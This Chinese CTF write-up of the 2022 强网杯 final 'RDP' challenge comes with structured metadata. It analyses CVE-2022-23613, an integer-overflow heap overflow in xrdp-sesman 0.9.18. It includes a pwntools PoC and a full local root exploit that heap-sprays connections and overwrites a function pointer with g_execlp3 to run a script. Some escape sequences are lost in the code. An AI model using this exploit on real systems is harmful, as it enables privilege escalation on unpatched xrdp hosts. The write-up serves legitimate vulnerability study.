---
title: 2022 强网杯 final - RDP
contest: 2022 强网杯 final
year: 2022
difficulty: hard
vuln_type:
- pwn_unknown
- auth_bypass
tags:
- XRDP
- xrdp-sesman
- CVE-2022-23613
- integer-overflow
- heap-overflow
- g_execlp3
- rdi-control
- heap-spray
- MAX_SHORT_LIVED_CONNECTIONS
attack_chain:
- 识别 xrdp-sesman 0.9.18 已知 CVE-2022-23613（header_size 整型溢出）
- CVE patch 单点修改：限制 header_size 上限
- poc：发送 'vvvv' + 0x80000000 (大端) 触发 to_read 负溢出
- to_read = self->header_size - read_so_far，0x80000000 - 小数 = 巨大正数
- trans_recv 接受 0x4160 字节，in_s 缓冲区只有 8192 → 堆溢出
- diff 把 MAX_SHORT_LIVED_CONNECTIONS 从 16 改成 512 → 堆喷更容易
- 用 g_execlp3（system 风格）覆盖 trans->trans_can_recv 函数指针
- rdi = trans 结构体头 = 命令字符串
- rdi 写 '/tmp/do\x00' 命令文件做提权脚本
key_payload: p32(0x80000000)[::-1] + 'a'*0x4160 + '/tmp/do\x00'
one_liner: CVE-2022-23613 整型溢出堆溢出 + rdi 控命令 + g_execlp3 提权
lesson: 老 CVE 重现是 0day 防御学习的捷径；整数溢出导致"超大 to_read"是堆溢出经典
quality: high
full_path: 2022QWB_final_RDP.full.md
meta_path: 2022QWB_final_RDP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2022 强网杯 final - RDP。CVE-2022-23613 整型溢出堆溢出 + rdi 控命令 + g_execlp3 提权。关键路径：识别 xrdp-sesman 0.9.18 已知 CVE-2022-23613（header_size 整型溢出） → CVE patch 单点修改：限制 header_size 上限 → poc：发送 'vvvv' + 0x80000000 (...
category: pwn
subcategory: pwn_other
subcategories:
- pwn_other
- logic
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/151803.html
reasoning_chain:
- '[触发点] xrdp-sesman 0.9.18 → 假设：找 CVE → [动作] 搜索 CVE-2022-23613 / [观察] patch 单点修改限制 header_size / [下一步] 构造 poc'
- '[触发点] poc ''vvvv'' + 0x80000000 大端 → 假设：整型溢出 → [动作] 触发 trans_recv / [观察] to_read 巨大正数 / [下一步] 堆溢出'
- '[触发点] in_s 缓冲区 8192 + 接受 0x4160 字节 → 假设：堆溢出 / [动作] diff 把 MAX_SHORT_LIVED_CONNECTIONS 改 512 → 堆喷 / [观察] 覆盖函数指针 / [下一步] rdi 控命令'
- '[触发点] g_execlp3 = system 风格 + rdi=trans 头 → 假设：rdi 写命令 / [动作] rdi=''/tmp/do\x00'' 提权脚本 / [观察] root 拿下'
failed_attempts:
- 试图找其他 CVE → 失败：0.9.18 仅 23613 匹配
- 试图不堆喷直接覆盖 → 失败：MAX_SHORT_LIVED_CONNECTIONS 默认 16 限制
key_observations:
- 老 CVE 重现是 0day 防御学习的捷径
- 整数溢出导致超大 to_read 是堆溢出经典
- g_execlp3(rdi) 是函数指针控 RCE 经典
- MAX_SHORT_LIVED_CONNECTIONS 是堆喷效率关键
prerequisites:
- CVE 搜索 + patch diff 分析
- 整数溢出（32 位 signed）原理
- C 函数调用约定（rdi 第一个参数）
---
# 2022QWB final RDP

> 原文: https://www.ctfiot.com/151803.html
> ID: 151803

题目要求我们攻击XRDP程序，从而达到本地提权的效果。

首先观察XRDP程序的版本信息：

root@RDP:/home/rdp/Desktop
# xrdp-sesman -version
xrdp-sesman 0.9.18
 The xrdp session manager
 Copyright (C) 2004-2020 Jay Sorg, Neutrino Labs, and all contributors.
 See https://github.com/neutrinolabs/xrdp for more information.

 Configure options:

然后在CVE里搜一下发现有个漏洞版本刚好合适，并且满足题目的提权要求。

从CVE介绍中获得漏洞补丁URL。
MISC:
https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa

可以看到修改的代码行数很少，可以比较容易的分析出漏洞成因。

根据patch信息以及漏洞描述可以判断出漏洞成因是size导致的整型溢出。这里的size会直接赋值给self->header_size。

进入题目虚拟机之后会在RW文件夹下找到一个diff文件。

看上去应该是作者为了方便我们使用漏洞实现提权操作而进行的一个diff。

查看一下服务开放的服务。

经分析，做题思路暂时可以确定为通过CVE-2022-23613漏洞配合题目所给出的diff攻击题目开放在3350的xrdp-sesman服务进行本地提权。

接下来在源码中对程序漏洞进行一下简单的分析，在sesman.c中会有一个主循环sesman_main_loop，主循环会创建一个g_list_trans。

其接收连接的函数主要实现在sesman_listen_conn_in中。

最后走到patch中的sesman_data_in。

有一个宏in_uint32_be，在parse.h中有具体展开，就不放了，其实就是从arg1中拿一个int出来给arg2，并让arg1作为int指针加一，这里可以理解成self->in_s指向了程序接收到的用户输入，其中第一个dword作为版本信息给version变量，第二个dword作为headersize给size变量。

在这里由于size是可以自己指定的，所以相当于self->header_size变成了一个用户可控的int类型数据。

在函数trans_check_wait_objs中有此变量的后续应用。

if (self->type1 == TRANS_TYPE_LISTENER)/* listening */
{
g_sck_can_recv
g_sck_accept
...
}
else /* connected server or client (2 or 3) */
{
 if (self->si != 0 && self->si->source[self->my_source] > MAX_SBYTES)
 {
 }
 else if (self->trans_can_recv(self, self->sck, 0))
 {
 cur_source = XRDP_SOURCE_NONE;
 if (self->si != 0)
 {
 cur_source = self->si->cur_source;
 self->si->cur_source = self->my_source;
 }
 read_so_far = (int) (self->in_s->end - self->in_s->data);
 to_read = self->header_size - read_so_far;
 if (to_read > 0)
 {
 read_bytes = self->trans_recv(self, self->in_s->end, to_read);
 ......
 }
 read_so_far = (int) (self->in_s->end - self->in_s->data);
 if (read_so_far == self->header_size)
 {
 if (self->trans_data_in != 0)
 {
 rv = self->trans_data_in(self);
 if (self->no_stream_init_on_data_in == 0)
 {
 init_stream(self->in_s, 0);
 }
 }
 }
}

程序在此函数中进行了监听和接收数据的处理流程，其中比较值得注意的就是这行代码：

to_read = self->header_size - read_so_far;

这里的to_read也为int，并且如果to_read大于零会执行self->trans_recv(self, self->in_s->end, to_read);

这个函数注册与create阶段：

即实际执行的是trans_tcp_recv，追溯到最后就是原生的recv函数，而其缓冲区则是self->in_s，通过init_stream函数分配空间。

分配到的是堆上的空间，而in_size则是在sesman.c中写死的8192。

分析到这里整体漏洞成因已经彻底清楚了，如果我们能控制一个不受任何限制的header_size，将其控制为0x80000000，即一个最小负数，从而绕过header_size不能大于总的输入长度的限制，然后read_so_far作为一个随意的小数，相减以后发生负溢出，header_size将变成一个非常巨大的远超8192的正数，从而导致堆溢出发生。

漏洞分析就到这里，接下来写一个poc调试一下看看是否会触发。

首先看一下xrdp-sesman的pid，然后attach上去，写出poc脚本进行测试，attach的时候断点可以下在trans_check_wait_objs处。

测试脚本非常简单。

from pwn import *
payload=b'v'*4
payload+=p32(0x80000000)
io=remote("127.0.0.1",3350)
io.send(payload)
io.send('a'*0x1000)

成功断在了函数处。

但是随着调试发现事情不对劲，这里明明应该是0x80000000和0x9，但是变成了0x80和0x9，导致预期的整数负溢出没有发生。

这也就导致到了调用tcp_recv的时候rdx并不是一个非常大的数。

猜测由于网络传输是大端序，所以不能直接p32，于是修改脚本：

这一次成功将rdx修改为一个超大正整数，发生堆溢出。

有了堆溢出以后，可以试着寻找分配在堆上且有函数指针的结构体，之前分析源码的时候有遇到过一个create函数。

这里不仅输入输出缓冲区是用init_stream分配出来的堆空间，其本身也是g_malloc分配出来的堆空间，上面填充了recv，send等函数，如果能够通过堆溢出将recv函数为程序本身就有的g_execlp3，则相当于可以调用system函数，那么能否控制rdi呢？来看看recv函数具体调用的时候寄存器的状态。

在调用的时候tcp_recv函数位置由rbx进行定位，而rbx和rdi所指向的都当前trans结构体，也就是说只要我们保证结构体中recv函数指针覆盖为exec的同时覆盖结构体的开头为我们想要执行的命令，则可以在下一次使用此trans接收数据的时候执行任意命令。

还剩一个问题，就是堆空间非常复杂，我们能否精准的覆盖到指定的结构体上完成了漏洞利用，这个问题一定程度上来说出题人已经帮我们解决了一大半了，还记得当初的diff吗。将原本为16的MAX_SHORT_LIVED_CONNECTIONS改成了512，这意味着我们可以通过不停创建trans进行堆喷。

通过堆溢出修改堆上的函数指针，并且rdi指向的是结构体头部，所以rdi也可以直接控下，由于我们的任务只是提权，所以可以提前在系统中写入要执行文件，这样在进行漏洞利用的时候只需要执行一条命令即可。

在实际调试的过程中遇到好几处地方需要保证只是是一个可写地址，具体有哪些地址需要额外关照，有两种方式，第一种是通过对程序进行逆向，分析其机构体中有哪些字段需要为可写地址，第二种方式是直接调试，第一次覆盖的时候除了函数指针以外其余所有地方直接用0填充，然后下断点进行调试，就可以看到有些取值指令是执行失败的，遇到取值指令失败的地方就填一个可写地址上去，慢慢调就可以了。

from pwn import *
elf=ELF('./xrdp-sesman')
li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')
lg = lambda x : print(' 33[32m' + str(x) + ' 33[0m')
with open("/tmp/do", "w") as f:
 f.write("#!/bin/bashnecho "Ayaka" > /flag")
os.system("chmod a+x /tmp/do")
conn_list=[]
def heap_spray():
 for i in range(100):
 io=remote("127.0.0.1",3350)
 conn_list.append(io)
heap_spray()
bss=0x40a000
input()
system_plt=elf.plt['g_execlp3']
payload=b'v'*4
payload+=p32(0x80000000)[::-1]
io1=conn_list[97]
io1.send(payload)
payload=p64(bss)*(0x4160//8)+p64(0x2b0)+b'/tmp/dox00'
payload+=p32(1)*2+p64(2)+p64(0)*3+p64(0x400318)+p64(bss)*2+p64(0)*71+p64(0x0000000000403BF0)+p64(0x0000000000403C40)*2
io1.send(payload)

conn_list[98].send("a"*8)

看雪ID：Ayakaaa

https://bbs.kanxue.com/user-home-954038.htm

*本文为看雪论坛优秀文章，由 Ayakaaa 原创，转载请注明来自看雪社区

# 往期推荐

1、2023 SDC 议题回顾 | 芯片安全和无线电安全底层渗透技术

2、SWPUCTF 2021 新生赛-老鼠走迷宫

3、OWASP 实战分析 level 1

4、【远控木马】银狐组织最新木马样本-分析

5、自研Unidbg trace工具实战ollvm反混淆

6、2023 SDC 议题回顾 | 深入 Android 可信应用漏洞挖掘

球分享

球点赞

球在看


```
root@RDP:/home/rdp/Desktop
# xrdp-sesman -version
xrdp-sesman 0.9.18
 The xrdp session manager
 Copyright (C) 2004-2020 Jay Sorg, Neutrino Labs, and all contributors.
 See https://github.com/neutrinolabs/xrdp for more information.

 Configure options:
if (self->type1 == TRANS_TYPE_LISTENER)/* listening */
{
g_sck_can_recv
g_sck_accept
...
}
else /* connected server or client (2 or 3) */
{
 if (self->si != 0 && self->si->source[self->my_source] > MAX_SBYTES)
 {
 }
 else if (self->trans_can_recv(self, self->sck, 0))
 {
 cur_source = XRDP_SOURCE_NONE;
 if (self->si != 0)
 {
 cur_source = self->si->cur_source;
 self->si->cur_source = self->my_source;
 }
 read_so_far = (int) (self->in_s->end - self->in_s->data);
 to_read = self->header_size - read_so_far;
 if (to_read > 0)
 {
 read_bytes = self->trans_recv(self, self->in_s->end, to_read);
 ......
 }
 read_so_far = (int) (self->in_s->end - self->in_s->data);
 if (read_so_far == self->header_size)
 {
 if (self->trans_data_in != 0)
 {
 rv = self->trans_data_in(self);
 if (self->no_stream_init_on_data_in == 0)
 {
 init_stream(self->in_s, 0);
 }
 }
 }
}
to_read = self->header_size - read_so_far;
from pwn import *
payload=b'v'*4
payload+=p32(0x80000000)
io=remote("127.0.0.1",3350)
io.send(payload)
io.send('a'*0x1000)
from pwn import *
elf=ELF('./xrdp-sesman')
li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')
lg = lambda x : print(' 33[32m' + str(x) + ' 33[0m')
with open("/tmp/do", "w") as f:
 f.write("#!/bin/bashnecho "Ayaka" > /flag")
os.system("chmod a+x /tmp/do")
conn_list=[]
def heap_spray():
 for i in range(100):
 io=remote("127.0.0.1",3350)
 conn_list.append(io)
heap_spray()
bss=0x40a000
input()
system_plt=elf.plt['g_execlp3']
payload=b'v'*4
payload+=p32(0x80000000)[::-1]
io1=conn_list[97]
io1.send(payload)
payload=p64(bss)*(0x4160//8)+p64(0x2b0)+b'/tmp/dox00'
payload+=p32(1)*2+p64(2)+p64(0)*3+p64(0x400318)+p64(bss)*2+p64(0)*71+p64(0x0000000000403BF0)+p64(0x0000000000403C40)*2
io1.send(payload)

conn_list[98].send("a"*8)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]